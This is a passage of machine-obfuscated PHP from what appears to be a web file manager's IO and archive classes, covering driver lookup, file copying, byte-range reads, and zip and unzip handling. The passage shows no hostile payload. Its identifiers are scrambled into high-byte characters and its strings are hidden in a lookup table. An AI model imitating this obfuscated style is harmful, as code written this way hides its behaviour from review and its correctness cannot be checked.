($ÈÈİƒüÇ->isFileOutServer()) { return $ÈÈİƒüÇ->fileOutImageServer($ôşëìÓ, $Äœ¬¶»¦); } return $ÈÈİƒüÇ->fileOutImage($ôşëìÓ, $Äœ¬¶»¦); } private static function driverIsSame($ëèèûã, $ªä¾˜²´) { $ÀøßàÄŠ =& $_SERVER[ùèÅ´Ãš]; $àëá¨Ü = $ëèèûã->getType(); $ÃşşµŸ” = $ªä¾˜²´->getType(); if ($àëá¨Ü != $ÃşşµŸ”) { return !1; } if ($àëá¨Ü == $ÀøßàÄŠ[835]) { return !0; } if ($àëá¨Ü == $ÀøßàÄŠ[109]) { return !0; } if ($ëèèûã->pathDriver == $ªä¾˜²´->pathDriver) { return !0; } return !1; } public static function copyUpdate($ì§¿Â, $İõäŞ¹¥) { $À¼¶®¨Î =& $_SERVER[ùèÅ´Ãš]; if (!IO::exist($ì§¿Â)) { return !1; } if (!IO::exist($İõäŞ¹¥)) { IO::mkdir($İõäŞ¹¥); } $Î˜ à©„ = array_to_keyvalue(self::listAllSimple($ì§¿Â), $À¼¶®¨Î[87]); $ö¸£ÎûÒ = array_to_keyvalue(self::listAllSimple($İõäŞ¹¥), $À¼¶®¨Î[87]); $Õ–£Àäã = array(); $¹æ„šç = array(); foreach ($Î˜ à©„ as $ıÂÂå—î => $ğŞÙçÖ·) { if (isset($ö¸£ÎûÒ[$ıÂÂå—î])) { if ($ğŞÙçÖ·[$À¼¶®¨Î[78]] == 1) { continue; } if ($ö¸£ÎûÒ[$ıÂÂå—î][$À¼¶®¨Î[79]] == $ğŞÙçÖ·[$À¼¶®¨Î[79]]) { continue; } } if ($ğŞÙçÖ·[$À¼¶®¨Î[78]] == 1) { $¹æ„šç[] = $İõäŞ¹¥ . $À¼¶®¨Î[8] . trim($ıÂÂå—î, $À¼¶®¨Î[8]); continue; } $ãÑ‡ô‡¬ = strstr(trim($ıÂÂå—î, $À¼¶®¨Î[8]), $À¼¶®¨Î[8]) ? get_path_father($ıÂÂå—î) : $À¼¶®¨Î[12]; $Õ–£Àäã[] = array($À¼¶®¨Î[1253] => $ğŞÙçÖ·[$À¼¶®¨Î[89]], $À¼¶®¨Î[1254] => rtrim($İõäŞ¹¥, $À¼¶®¨Î[8]) . $À¼¶®¨Î[8] . $ãÑ‡ô‡¬, $À¼¶®¨Î[1255] => $ğŞÙçÖ·); } $ªÁñ¸… = array($À¼¶®¨Î[233] => $Õ–£Àäã, $À¼¶®¨Î[78] => $¹æ„šç); Hook::trigger($À¼¶®¨Î[1256], $ì§¿Â, $İõäŞ¹¥, $ªÁñ¸…); foreach ($¹æ„šç as $ğŞÙçÖ·) { IO::mkdir($ğŞÙçÖ·); } foreach ($Õ–£Àäã as $ğŞÙçÖ·) { IO::copy($ğŞÙçÖ·[$À¼¶®¨Î[1253]], $ğŞÙçÖ·[$À¼¶®¨Î[1254]], REPEAT_REPLACE); } } public static function fileSubstr($ŞÉ¤Õ„•, $Ã‰•©¬, $ã¨œÓÛ¨ = false) { $ğùû’‹ =& $_SERVER[ùèÅ´Ãš]; $¢îÁíßğ = self::driverMake($ŞÉ¤Õ„•); $Á êì˜ = $¢îÁíßğ->size($ŞÉ¤Õ„•); $«©‚ÙÙç = $Ã‰•©¬; $¹ÆÅ”«° = $ã¨œÓÛ¨; if ($Ã‰•©¬ < 0) { $Ã‰•©¬ = $Á êì˜ + $Ã‰•©¬; } if ($ã¨œÓÛ¨ === !1) { $ã¨œÓÛ¨ = $Á êì˜ - $Ã‰•©¬; } if ($Ã‰•©¬ + $ã¨œÓÛ¨ > $Á êì˜) { $ã¨œÓÛ¨ = $Á êì˜ - $Ã‰•©¬; } if (!$Á êì˜ && $¢îÁíßğ->getType() == $ğùû’‹[109] && !$¢îÁíßğ->exist($ŞÉ¤Õ„•)) { $ôÑãäáù = get_path_this($ŞÉ¤Õ„•); $‰âßş¡ = parse_url_query($ôÑãäáù); if (is_array($‰âßş¡) && isset($‰âßş¡[$ğùû’‹[32]])) { $ôÑãäáù = urldecode($‰âßş¡[$ğùû’‹[32]]); } throw new Exception($ğùû’‹[1257] . LNG($ğùû’‹[1258]) . $ğùû’‹[1054] . clear_html($ôÑãäáù) . $ğùû’‹[12]); } if ($ã¨œÓÛ¨ <= 0) { return $ğùû’‹[12]; } if ($Ã‰•©¬ < 0 || $Ã‰•©¬ >= $Á êì˜ || $ã¨œÓÛ¨ > $GLOBALS[$ğùû’‹[6]][$ğùû’‹[92]][$ğùû’‹[1259]]) { throw new Exception("\146\151\x6c\x65\x52\145\x61\x64\x20\145\x72\x72\x6f\162\x2c\x6f\x76\145\x72\40\x69\x6f\x52\145\x61\x64\x4d\x61\170\x21\40\x73\x74\x61\162\x74\x3d{$Ã‰•©¬}\73\x6c\145\156\147\164\x68\75{$ã¨œÓÛ¨}\x3b\40\x73\151\172\145\x3d{$Á êì˜}\x3b"); } $ŠªÌ“ˆ÷ = $¢îÁíßğ->fileSubstr($ŞÉ¤Õ„•, $Ã‰•©¬, $ã¨œÓÛ¨); if (!$ŠªÌ“ˆ÷ && $ã¨œÓÛ¨ && isset($GLOBALS[$ğùû’‹[1260]])) { throw new Exception($GLOBALS[$ğùû’‹[1260]][$ğùû’‹[1261]]); } return $ŠªÌ“ˆ÷; } private static function driverMake(&$±İ˜Ç«õ) { $³€Ú›¦ =& $_SERVER[ùèÅ´Ãš]; $ÏèŞà® = KodIO::parse($±İ˜Ç«õ); if (!self::$driverListSystem) { $–Ú¥ªşú = Model($³€Ú›¦[845])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($–Ú¥ªşú, $³€Ú›¦[477]); } if ($ÏèŞà®[$³€Ú›¦[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÏèŞà®[$³€Ú›¦[477]]]) { throw new Exception($³€Ú›¦[1262]); return !1; } $±İ˜Ç«õ = $ÏèŞà®[$³€Ú›¦[1263]]; $©Š‚ÆéÑ = self::driverGet($ÏèŞà®, $±İ˜Ç«õ); return $©Š‚ÆéÑ; } private static function driverGet($¯Ğ²ú©, &$Æ´ùªµ¹) { $ˆ“–é°ü =& $_SERVER[ùèÅ´Ãš]; $“Â¿öæ = $¯Ğ²ú©[$ˆ“–é°ü[1264]]; $ˆÉ—‘° = $¯Ğ²ú©[$ˆ“–é°ü[477]]; switch ($¯Ğ²ú©[$ˆ“–é°ü[33]]) { case KodIO::KOD_IO: $ğÕõßÓÊ = self::$driverListSystem[$ˆÉ—‘°]; break; case KodIO::KOD_SOURCE: $Æ´ùªµ¹ = $ˆÉ—‘° . $Æ´ùªµ¹; $ğÕõßÓÊ = array($ˆ“–é°ü[1265] => $ˆ“–é°ü[1266], $ˆ“–é°ü[6] => $¯Ğ²ú©); $ğÕõßÓÊ[$ˆ“–é°ü[6]][$ˆ“–é°ü[1267]] = $¯Ğ²ú©[$ˆ“–é°ü[477]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‰ì…¯·‚ = $GLOBALS[$ˆ“–é°ü[1268]]; self::$driverListUser = array_to_keyvalue($‰ì…¯·‚, $ˆ“–é°ü[477]); } $ğÕõßÓÊ = self::$driverListUser[$ˆÉ—‘°]; break; case KodIO::KOD_SHARE_LINK: $ğÕõßÓÊ = array($ˆ“–é°ü[1265] => $ˆ“–é°ü[1269], $ˆ“–é°ü[6] => $¯Ğ²ú©); $‰â²’¶½ = Action($ˆ“–é°ü[1270])->sharePathInfo($¯Ğ²ú©[$ˆ“–é°ü[87]]); $Æ´ùªµ¹ = $‰â²’¶½[$ˆ“–é°ü[194]]; if (!$‰â²’¶½[$ˆ“–é°ü[194]]) { $ğÌã†¹ = Model($ˆ“–é°ü[671])->getInfo($‰â²’¶½[$ˆ“–é°ü[672]]); $Æ´ùªµ¹ = KodIO::clear($ğÌã†¹[$ˆ“–é°ü[1271]] . $¯Ğ²ú©[$ˆ“–é°ü[1263]]); $¯Ğ²ú©[$ˆ“–é°ü[564]] = $ğÌã†¹; $¯Ğ²ú©[$ˆ“–é°ü[1244]] = $Æ´ùªµ¹; $ğÕõßÓÊ = array($ˆ“–é°ü[1265] => $ˆ“–é°ü[1272], $ˆ“–é°ü[6] => $¯Ğ²ú©); } else { $ğÕõßÓÊ[$ˆ“–é°ü[6]][$ˆ“–é°ü[1267]] = $‰â²’¶½[$ˆ“–é°ü[194]]; } break; case KodIO::KOD_SHARE_ITEM: $ğÕõßÓÊ = array($ˆ“–é°ü[1265] => $ˆ“–é°ü[1273], $ˆ“–é°ü[6] => $¯Ğ²ú©); $ğÌã†¹ = Model($ˆ“–é°ü[671])->getInfo($¯Ğ²ú©[$ˆ“–é°ü[477]]); if ($ğÌã†¹[$ˆ“–é°ü[194]] == $ˆ“–é°ü[231]) { $Æ´ùªµ¹ = KodIO::clear($ğÌã†¹[$ˆ“–é°ü[1271]] . $¯Ğ²ú©[$ˆ“–é°ü[1263]]); $¯Ğ²ú©[$ˆ“–é°ü[564]] = $ğÌã†¹; $¯Ğ²ú©[$ˆ“–é°ü[1244]] = $Æ´ùªµ¹; $ğÕõßÓÊ = array($ˆ“–é°ü[1265] => $ˆ“–é°ü[1274], $ˆ“–é°ü[6] => $¯Ğ²ú©); } else { if (!$Æ´ùªµ¹) { $Æ´ùªµ¹ = $ğÌã†¹[$ˆ“–é°ü[194]]; } $ğÕõßÓÊ[$ˆ“–é°ü[6]][$ˆ“–é°ü[1267]] = $ğÌã†¹[$ˆ“–é°ü[194]]; } break; default: $Æ´ùªµ¹ = $¯Ğ²ú©[$ˆ“–é°ü[87]]; $ğÕõßÓÊ = array($ˆ“–é°ü[1265] => $ˆ“–é°ü[1275]); break; } $ÙùëÚ = $¯Ğ²ú©[$ˆ“–é°ü[87]]; if (!isset(self::$driverCache[$ÙùëÚ])) { $Ó¯Ñıï§ = strtolower($ğÕõßÓÊ[$ˆ“–é°ü[98]]); $×ºŞ™Œ¹ = $GLOBALS[$ˆ“–é°ü[6]][$ˆ“–é°ü[92]][$ˆ“–é°ü[909]]; $¹»ÑÁ­å = $ˆ“–é°ü[77] . (isset($×ºŞ™Œ¹[$Ó¯Ñıï§]) ? $×ºŞ™Œ¹[$Ó¯Ñıï§] : ucfirst($Ó¯Ñıï§)); if (!class_exists($¹»ÑÁ­å)) { show_json("{$¹»ÑÁ­å}\x20\x6e\x6f\164\x20\x65\170\151\x73\x74\163\41", !1); } $¿²‹Åãï = isset($ğÕõßÓÊ[$ˆ“–é°ü[6]]) ? $ğÕõßÓÊ[$ˆ“–é°ü[6]] : !1; self::$driverCache[$ÙùëÚ] = new $¹»ÑÁ­å($¿²‹Åãï); } $²˜ùÕ¸ = self::$driverCache[$ÙùëÚ]; $²˜ùÕ¸->pathDriver = $“Â¿öæ; $²˜ùÕ¸->pathBase = $ˆ“–é°ü[12]; if (isset($ğÕõßÓÊ[$ˆ“–é°ü[6]][$ˆ“–é°ü[1276]])) { $²˜ùÕ¸->pathBase = rtrim($ğÕõßÓÊ[$ˆ“–é°ü[6]][$ˆ“–é°ü[1276]], $ˆ“–é°ü[8]) . $ˆ“–é°ü[8]; $Æ´ùªµ¹ = $²˜ùÕ¸->pathBase . ltrim($Æ´ùªµ¹, $ˆ“–é°ü[8]); } $Æ´ùªµ¹ = $²˜ùÕ¸->getPath($Æ´ùªµ¹); if (isset($¯Ğ²ú©[$ˆ“–é°ü[1244]])) { $Æ´ùªµ¹ = $¯Ğ²ú©[$ˆ“–é°ü[1244]]; } $²˜ùÕ¸->path = $Æ´ùªµ¹; return $²˜ùÕ¸; } public static function errorTips($¢±­‘ËÀ = false) { $§Á”¢ŸÌ =& $_SERVER[ùèÅ´Ãš]; static $¡Í·ïÔ§ = array(); $…Øú¹è = 1000; if ($¢±­‘ËÀ === -1) { return $¡Í·ïÔ§ ? $¡Í·ïÔ§[count($¡Í·ïÔ§) - 1] : $§Á”¢ŸÌ[12]; } if ($¢±­‘ËÀ === !1) { return implode($§Á”¢ŸÌ[288], $¡Í·ïÔ§); } if (count($¡Í·ïÔ§) >= $…Øú¹è) { $¡Í·ïÔ§ = array_slice($¡Í·ïÔ§, $…Øú¹è * 0.5, $…Øú¹è); } $¡Í·ïÔ§[] = $¢±­‘ËÀ; write_log($§Á”¢ŸÌ[176] . ACTION . $§Á”¢ŸÌ[1277] . $¢±­‘ËÀ, $§Á”¢ŸÌ[1278]); } public static function getLastError($ËïüÛ¡Ä = '') { $¼‚şåë = self::errorTips(-1); return $¼‚şåë ? $¼‚şåë : $ËïüÛ¡Ä; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $®ó„Œ; if ($®ó„Œ) { return $®ó„Œ; } $µ³ò = IO::init($_SERVER[ùèÅ´Ãš][8]); return $µ³ò; } private static function iconvSystem($¯¡¿õ) { return self::local()->iconvSystem($¯¡¿õ); } private static function iconvApp($¿¾¢ò) { return self::local()->iconvApp($¿¾¢ò); } public static function zipFolder($şøÂÅ¬­, $µ¸º¬Í„ = "\x7a\x69\160", $İœ’ö’› = '', $ƒ·èŞ´ = REPEAT_RENAME) { $Ö¢Òí· =& $_SERVER[ùèÅ´Ãš]; $é…É¶§ø = IO::listPath($şøÂÅ¬­); if (!$é…É¶§ø) { return !1; } $é…É¶§ø = array_merge($é…É¶§ø[$Ö¢Òí·[85]], $é…É¶§ø[$Ö¢Òí·[86]]); return self::zip($é…É¶§ø, $µ¸º¬Í„, $İœ’ö’›, $ƒ·èŞ´); } public static function zip($›¾ş•ìı, $äÍùÅ©à = "\172\x69\160", $ «ï¥Ç¢ = '', $Û«°¹ë˜ = REPEAT_RENAME) { $ ²÷ûçÁ =& $_SERVER[ùèÅ´Ãš]; if (is_string($›¾ş•ìı) && $›¾ş•ìı) { $›¾ş•ìı = array(array($ ²÷ûçÁ[87] => $›¾ş•ìı)); } $§‰ëàÓô = self::init($›¾ş•ìı[0][$ ²÷ûçÁ[87]]); $½ƒ¡ÀÈÀ = self::info($›¾ş•ìı[0][$ ²÷ûçÁ[87]]); $’Õ ñ—Æ = $ ²÷ûçÁ[12]; $âÉÂˆ„« = $ ²÷ûçÁ[12]; $†¿ÛŠàİ = $ ²÷ûçÁ[12]; if ($ «ï¥Ç¢ && substr($ «ï¥Ç¢, -1, 1) != $ ²÷ûçÁ[8]) { $âÉÂˆ„« = get_path_father($ «ï¥Ç¢); $†¿ÛŠàİ = get_path_this($ «ï¥Ç¢); } else { $âÉÂˆ„« = self::pathFather($½ƒ¡ÀÈÀ[$ ²÷ûçÁ[87]]); $†¿ÛŠàİ = $½ƒ¡ÀÈÀ[$ ²÷ûçÁ[32]] . $ ²÷ûçÁ[10] . $äÍùÅ©à; if (count($›¾ş•ìı) > 1) { $Ì®àé = IO::info($âÉÂˆ„«); $†¿ÛŠàİ = $Ì®àé[$ ²÷ûçÁ[32]] . $ ²÷ûçÁ[10] . $äÍùÅ©à; } if ($ «ï¥Ç¢) { $âÉÂˆ„« = $ «ï¥Ç¢; } } if ($§‰ëàÓô->getType() == $ ²÷ûçÁ[109]) { $öşö„¼Ÿ = self::init($âÉÂˆ„«); $Ğ‘³›Ü = $öşö„¼Ÿ->getType() == $ ²÷ûçÁ[109] ? $âÉÂˆ„« : get_path_father($§‰ëàÓô->path); $Ğ‘³›Ü = IO::getPathInner($Ğ‘³›Ü); $Ğ‘³›Ü = rtrim($Ğ‘³›Ü, $ ²÷ûçÁ[8]) . $ ²÷ûçÁ[8]; mk_dir($Ğ‘³›Ü); } else { $’Õ ñ—Æ = TEMP_FILES . $ ²÷ûçÁ[1279] . time() . rand_string(8) . $ ²÷ûçÁ[8]; mk_dir($’Õ ñ—Æ); file_put_contents($’Õ ñ—Æ . $ ²÷ûçÁ[1280], $ ²÷ûçÁ[12]); $Ğ‘³›Ü = $’Õ ñ—Æ; } $ŸíÙ×Î = IO::info($Ğ‘³›Ü); if (!$ŸíÙ×Î || !$ŸíÙ×Î[$ ²÷ûçÁ[236]]) { show_json(LNG($ ²÷ûçÁ[1281]), !1); } $½ËæÒş® = self::zipFileList($›¾ş•ìı, $’Õ ñ—Æ); foreach ($½ËæÒş® as $Úßú‰âÜ => $¨¾¦²â¡) { $½ËæÒş®[$Úßú‰âÜ] = self::iconvSystem($¨¾¦²â¡); } $’¬ª‰æ = get_filename_auto($Ğ‘³›Ü . $†¿ÛŠàİ, $ ²÷ûçÁ[12], $Û«°¹ë˜); KodArchive::create(self::iconvSystem($’¬ª‰æ), $½ËæÒş®); if (!IO::exist($’¬ª‰æ)) { if ($’Õ ñ—Æ) { del_dir($’Õ ñ—Æ); } write_log($ ²÷ûçÁ[1282] . $’¬ª‰æ, $ ²÷ûçÁ[390]); show_json(LNG($ ²÷ûçÁ[1283]), !1); } if (!$’Õ ñ—Æ) { return $’¬ª‰æ; } $ïÂß™½‡ = self::move($’¬ª‰æ, $âÉÂˆ„«, $Û«°¹ë˜); if ($’Õ ñ—Æ) { del_dir($’Õ ñ—Æ); } if (!$’¬ª‰æ) { write_log($ ²÷ûçÁ[1284] . $’¬ª‰æ . $ ²÷ûçÁ[1285] . $âÉÂˆ„«, $ ²÷ûçÁ[390]); show_json(LNG($ ²÷ûçÁ[1283]), !1); } return $ïÂß™½‡; } public static function unzip($†ôÊòÛ³, $¦©ÕíàË, $Éß¶•Œ‰ = "\x2d\61", $ûéĞ†—¼ = "\162\x65\x70\x6c\x61\143\x65") { $Á·„†¥ =& $_SERVER[ùèÅ´Ãš]; $©˜ê¦š´ = parent::info($†ôÊòÛ³); if (!$©˜ê¦š´) { show_json(LNG($Á·„†¥[1286]), !1); } $ÊÄ™Ü… = IO::infoFullSimple($¦©ÕíàË); if (!$ÊÄ™Ü…) { $¦©ÕíàË = IO::mkdir($¦©ÕíàË); } if (isset($ÊÄ™Ü…[$Á·„†¥[194]]) && trim($ÊÄ™Ü…[$Á·„†¥[87]], $Á·„†¥[8]) != trim($¦©ÕíàË, $Á·„†¥[8])) { $€Œì‰šñ = KodIO::make($ÊÄ™Ü…[$Á·„†¥[193]]); $ß÷ş…ê¿ = IO::fileNameAuto($€Œì‰šñ, $ÊÄ™Ü…[$Á·„†¥[32]], REPEAT_RENAME_FOLDER, !0); $¦©ÕíàË = IO::mkdir($€Œì‰šñ . $ß÷ş…ê¿); } $Éß¶•Œ‰ = $Éß¶•Œ‰ && $Éß¶•Œ‰ != $Á·„†¥[1287] ? @json_decode($Éß¶•Œ‰, !0) : -1; $²Ü‚•µ¡ = self::unzipPart($†ôÊòÛ³, $Éß¶•Œ‰); if (!$²Ü‚•µ¡ || !IO::exist($²Ü‚•µ¡[$Á·„†¥[233]])) { show_json(LNG($Á·„†¥[108]), !1); } $¥²Öê™ó = $²Ü‚•µ¡[$Á·„†¥[1288]][count($²Ü‚•µ¡[$Á·„†¥[1288]]) - 1]; if ($¥²Öê™ó[$Á·„†¥[1289]] == -1 || substr($¥²Öê™ó[$Á·„†¥[32]], -1, 1) == $Á·„†¥[8]) { $åø¹Ãäö = $²Ü‚•µ¡[$Á·„†¥[1290]] . rand_string(10) . $Á·„†¥[8]; mk_dir($åø¹Ãäö); $í‘¸ôÇŒ = count($²Ü‚•µ¡[$Á·„†¥[1288]]) == 1 ? IO::ext($†ôÊòÛ³) : get_path_ext($²Ü‚•µ¡[$Á·„†¥[233]]); $î¨×õÓ½ = KodArchive::extract(self::iconvSystem($²Ü‚•µ¡[$Á·„†¥[233]]), $åø¹Ãäö, $¥²Öê™ó[$Á·„†¥[1289]], $ß÷ş…ê¿, $í‘¸ôÇŒ); self::unzipErrorCheck($î¨×õÓ½, array($Á·„†¥[1291], $†ôÊòÛ³, $í‘¸ôÇŒ, $¦©ÕíàË, $²Ü‚•µ¡)); Hook::trigger($Á·„†¥[1292], $åø¹Ãäö); recursion_dir($åø¹Ãäö, $›îËé‹¤, $ŸåèøÃØ, 0); $¯ôñå¦ = array_merge($›îËé‹¤, $ŸåèøÃØ); $¢£®Êå = array(); foreach ($¯ôñå¦ as $¤Ó­½•é) { $Â­úÂŠâ = IO::move(self::iconvApp($¤Ó­½•é), $¦©ÕíàË, $ûéĞ†—¼); if ($Â­úÂŠâ) { $¢£®Êå[] = $Â­úÂŠâ; } } del_dir($åø¹Ãäö); } else { $Â­úÂŠâ = IO::move($²Ü‚•µ¡[$Á·„†¥[233]], $¦©ÕíàË, $ûéĞ†—¼, get_path_this($¥²Öê™ó[$Á·„†¥[32]])); if ($Â­úÂŠâ) { $¢£®Êå[] = $Â­úÂŠâ; } } return $¢£®Êå ? $¢£®Êå : !1; } public static function unzipList($ëç£Á–Ì) { $…ÂúÏÉâ =& $_SERVER[ùèÅ´Ãš]; $åå÷±º½ = isset($ëç£Á–Ì[$…ÂúÏÉâ[1293]]) ? $ëç£Á–Ì[$…ÂúÏÉâ[1293]] : !1; $¶ÄìøÀı = isset($ëç£Á–Ì[$…ÂúÏÉâ[1289]]) ? @json_decode($ëç£Á–Ì[$…ÂúÏÉâ[1289]], !0) : -1; $ÒÑü©®ˆ = self::unzipPart($ëç£Á–Ì[$…ÂúÏÉâ[87]], $¶ÄìøÀı); if (!$ÒÑü©®ˆ || !IO::exist($ÒÑü©®ˆ[$…ÂúÏÉâ[233]])) { show_json(LNG($…ÂúÏÉâ[108]), !1); } $Ğù£Ş¡ = $ÒÑü©®ˆ[$…ÂúÏÉâ[1288]][count($ÒÑü©®ˆ[$…ÂúÏÉâ[1288]]) - 1]; $œ²µ¡Ø = in_array(IO::ext($ÒÑü©®ˆ[$…ÂúÏÉâ[233]]), array($…ÂúÏÉâ[390], $…ÂúÏÉâ[1294], $…ÂúÏÉâ[1295], $…ÂúÏÉâ[1296], $…ÂúÏÉâ[1297], $…ÂúÏÉâ[1298])); if (!$åå÷±º½ && ($Ğù£Ş¡[$…ÂúÏÉâ[1289]] == -1 || $œ²µ¡Ø)) { $Û¿æö¼‚ = $ÒÑü©®ˆ[$…ÂúÏÉâ[1290]] . get_path_this($ÒÑü©®ˆ[$…ÂúÏÉâ[233]]) . $…ÂúÏÉâ[1299]; if (!IO::exist($Û¿æö¼‚)) { $ë†Ñİíµ = $Ğù£Ş¡[$…ÂúÏÉâ[1289]] == -1 ? get_path_ext(IO::pathThis($ëç£Á–Ì[$…ÂúÏÉâ[87]])) : get_path_ext($ÒÑü©®ˆ[$…ÂúÏÉâ[233]]); $¤“™Ñû = KodArchive::listContent(self::iconvSystem($ÒÑü©®ˆ[$…ÂúÏÉâ[233]]), !0, $ë†Ñİíµ); self::unzipErrorCheck($¤“™Ñû, array($…ÂúÏÉâ[1300], $ëç£Á–Ì, $ÒÑü©®ˆ)); @file_put_contents($Û¿æö¼‚, json_encode($¤“™Ñû[$…ÂúÏÉâ[1301]])); } return @json_decode(IO::getContent($Û¿æö¼‚), !0); } IO::fileOut($ÒÑü©®ˆ[$…ÂúÏÉâ[233]], $åå÷±º½, get_path_this($Ğù£Ş¡[$…ÂúÏÉâ[32]])); die; } private static function zipFileList($ú—ºÚñ½, $½¾°µş‹ = false) { $éıäë =& $_SERVER[ùèÅ´Ãš]; $Ö™ª´Ş‡ = array(); foreach ($ú—ºÚñ½ as $­Œ«•Æ) { $Ù„ùéÆ­ = $­Œ«•Æ[$éıäë[87]]; if ($½¾°µş‹) { $Ù„ùéÆ­ = self::copy($­Œ«•Æ[$éıäë[87]], $½¾°µş‹, $éıäë[902]); } else { $êÄ„„ = self::init($­Œ«•Æ[$éıäë[87]]); if ($êÄ„„->getType() == $éıäë[109]) { $Ù„ùéÆ­ = $êÄ„„->path; } } if ($Ù„ùéÆ­ && self::local()->exist($Ù„ùéÆ­)) { $Ö™ª´Ş‡[$­Œ«•Æ[$éıäë[87]]] = $Ù„ùéÆ­; } } if (!empty($Ö™ª´Ş‡)) { return array_values($Ö™ª´Ş‡); } show_json(LNG($éıäë[1258]), !1); } private static function localFilePath($ÄÔı½™Ç) { $òÇû÷ =& $_SERVER[ùèÅ´Ãš]; $Ëå³Àù† = KodIO::parse($ÄÔı½™Ç); if ($Ëå³Àù†[$òÇû÷[33]] == KodIO::KOD_SOURCE) { $áî·Á¬û = Model($òÇû÷[908])->fileInfoGet(KodIO::sourceID($ÄÔı½™Ç)); if (!$áî·Á¬û[$òÇû÷[87]]) { show_json($òÇû÷[1302], !1); } $ÄÔı½™Ç = $áî·Á¬û[$òÇû÷[87]]; } $´×ĞÊ‹¢ = self::init($ÄÔı½™Ç); if ($´×ĞÊ‹¢->pathParse[$òÇû÷[1244]]) { $ÄÔı½™Ç = $´×ĞÊ‹¢->pathParse[$òÇû÷[1244]]; $´×ĞÊ‹¢ = self::init($ÄÔı½™Ç); } $ä™é„™€ = $´×ĞÊ‹¢->getType(); if ($ä™é„™€ == $òÇû÷[109] || $ä™é„™€ == $òÇû÷[1303]) { if (!$´×ĞÊ‹¢->exist($´×ĞÊ‹¢->path)) { show_json(LNG($òÇû÷[108]), !1); } return $´×ĞÊ‹¢->path; } return !1; } public static function unzipPart($¸ÔŸê÷, $¨İ¬İ©Á = -1) { $»—á½× =& $_SERVER[ùèÅ´Ãš]; $Ÿûœ†Öğ = IO::pathThis($¸ÔŸê÷); if (!$¨İ¬İ©Á || $¨İ¬İ©Á == -1) { $œâøâ¼÷ = array(array($»—á½×[32] => $Ÿûœ†Öğ, $»—á½×[1289] => -1)); $œâøâ¼÷[0][$»—á½×[1304]] = $œâøâ¼÷[0][$»—á½×[32]]; } else { if (is_array($¨İ¬İ©Á)) { $œâøâ¼÷ = $¨İ¬İ©Á; $¤¶Õ‚áì = count($œâøâ¼÷) - 1; for ($Ì²ø£Íê = 0; $Ì²ø£Íê <= $¤¶Õ‚áì; $Ì²ø£Íê++) { $ÇÎï¹Î = $œâøâ¼÷[$Ì²ø£Íê]; $½×™ºìş = get_path_this($ÇÎï¹Î[$»—á½×[32]]) . (checkExtSafe($ÇÎï¹Î[$»—á½×[32]]) ? $»—á½×[12] : $»—á½×[1305]); $œâøâ¼÷[$Ì²ø£Íê][$»—á½×[1304]] = $»—á½×[1306] . intval($ÇÎï¹Î[$»—á½×[1289]]) . $»—á½×[464] . $½×™ºìş; if ($Ì²ø£Íê == 0) { continue; } $œâøâ¼÷[$Ì²ø£Íê][$»—á½×[1304]] = $œâøâ¼÷[$Ì²ø£Íê - 1][$»—á½×[1304]] . $»—á½×[1307] . $œâøâ¼÷[$Ì²ø£Íê][$»—á½×[1304]]; } } } if (!is_array($œâøâ¼÷) || count($œâøâ¼÷) == 0) { return !1; } $Ú¬¯Á  = $œâøâ¼÷[count($œâøâ¼÷) - 1]; if (!IO::exist($¸ÔŸê÷)) { return !1; } $«›š’ˆÁ = TEMP_FILES . $»—á½×[1308] . kodIO::hashPathSafe($¸ÔŸê÷) . $»—á½×[8]; $´êœÈÈÖ = $«›š’ˆÁ . $Ú¬¯Á [$»—á½×[1304]]; mk_dir($«›š’ˆÁ); file_put_contents(TEMP_FILES . $»—á½×[1280], $»—á½×[12]); if (IO::exist($´êœÈÈÖ)) { return array($»—á½×[233] => $´êœÈÈÖ, $»—á½×[1288] => $œâøâ¼÷, $»—á½×[1290] => $«›š’ˆÁ); } $®Ô¯ª¼ó = self::localFilePath($¸ÔŸê÷); if (!$®Ô¯ª¼ó) { $®Ô¯ª¼ó = $«›š’ˆÁ . $»—á½×[1309]; if (!IO::exist($®Ô¯ª¼ó)) { self::copy($¸ÔŸê÷, $«›š’ˆÁ, !1, get_path_this($®Ô¯ª¼ó)); } } if (!$®Ô¯ª¼ó || !IO::exist($®Ô¯ª¼ó)) { return !1; } if ($Ú¬¯Á [$»—á½×[1289]] == -1) { return array($»—á½×[233] => $®Ô¯ª¼ó, $»—á½×[1288] => $œâøâ¼÷, $»—á½×[1290] => $«›š’ˆÁ); } $±Ÿåä¥± = $®Ô¯ª¼ó; foreach ($œâøâ¼÷ as $Ì²ø£Íê => $ÇÎï¹Î) { if (!$ÇÎï¹Î || $ÇÎï¹Î[$»—á½×[1289]] == $»—á½×[1287]) { break; } if (substr($ÇÎï¹Î[$»—á½×[32]], -1, 1) == $»—á½×[8]) { break; } $‚˜ŒÏøÓ = in_array(get_path_ext($ÇÎï¹Î[$»—á½×[1304]]), array($»—á½×[390], $»—á½×[1294], $»—á½×[1295], $»—á½×[1296], $»—á½×[1297], $»—á½×[1298])); $€ïïóÌ = $Ì²ø£Íê == count($œâøâ¼÷) - 1 && $‚˜ŒÏøÓ; $ ƒ„ä’Î = $«›š’ˆÁ . $ÇÎï¹Î[$»—á½×[1304]]; $²¯±Ø½” = $«›š’ˆÁ . get_path_this($ÇÎï¹Î[$»—á½×[32]]); if (IO::exist($ ƒ„ä’Î)) { $±Ÿåä¥± = $ ƒ„ä’Î; continue; } $¦çù«…È = $Ì²ø£Íê == 0 ? get_path_ext($Ÿûœ†Öğ) : get_path_ext($±Ÿåä¥±); $ÛÎµÅİ = KodArchive::extract(self::iconvSystem($±Ÿåä¥±), $«›š’ˆÁ, $ÇÎï¹Î[$»—á½×[1289]], $Öğ˜ÚÙ«, $¦çù«…È); self::unzipErrorCheck($ÛÎµÅİ, array($»—á½×[1310], $¸ÔŸê÷, $œâøâ¼÷, $ÇÎï¹Î, $ ƒ„ä’Î)); if (IO::exist($²¯±Ø½”)) { IO::rename($²¯±Ø½”, get_path_this($ ƒ„ä’Î)); } $±Ÿåä¥± = $ ƒ„ä’Î; } $´êœÈÈÖ = $±Ÿåä¥±; return array($»—á½×[233] => $±Ÿåä¥±, $»—á½×[1288] => $œâøâ¼÷, $»—á½×[1290] => $«›š’ˆÁ); } private static function unzipErrorCheck($±óı¦óÌ, $ ¶…œò = false) { $‹–•»Ìä =& $_SERVER[ùèÅ´Ãš]; if ($±óı¦óÌ[$‹–•»Ìä[1311]]) { return !0; } write_log(array($‹–•»Ìä[1312], $±óı¦óÌ, $ ¶…œò), 